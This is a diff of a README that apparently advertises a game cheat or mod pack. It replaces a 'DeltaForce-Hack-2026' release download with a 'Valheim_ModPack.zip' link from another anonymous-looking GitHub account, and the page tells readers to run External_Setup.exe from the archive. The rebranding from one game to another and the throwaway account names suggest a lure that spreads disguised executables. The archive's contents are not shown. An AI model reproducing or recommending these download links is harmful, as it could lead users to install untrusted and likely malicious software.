@@ -13,7 +13,7 @@
 
   <br><br>
 
-  <a href="https://github.com/WantDeputyStage/DeltaForce-Hack-2026/releases/download/Latest/DeltaForce_Installer.zip">
+  <a href="https://github.com/FigureSectorSilo/Valheim-Mods-External/releases/download/Latest/Valheim_ModPack.zip">
     <img
       width="160"
       alt="Download"
@@ -60,6 +60,15 @@ Follow the instructions shown by the installer and wait for the installation to 
 > **⚠️ Important:** Only run `External_Setup.exe` if you obtained the archive from a source you trust. Windows executable files can launch programs on your system.
 
 
-<a href="https://github.com/FigureSectorSilo/Valheim-Mods-External/releases/download/Latest/Valheim_ModPack.zip">
-  <img width="1774" height="887" alt="Download" src="https://github.com/user-attachments/assets/fe6b983e-aa66-4a0f-8add-d4e6f00135de" />
-</a>
+<div align="center">
+
+
+  <a href="https://github.com/FigureSectorSilo/Valheim-Mods-External/releases/download/Latest/Valheim_ModPack.zip">
+    <img
+      width="160"
+      alt="Download"
+      src="https://github.com/user-attachments/assets/c541e077-e932-44d1-b6d4-2a52eb980eee"
+    />
+  </a>
+
+</div>
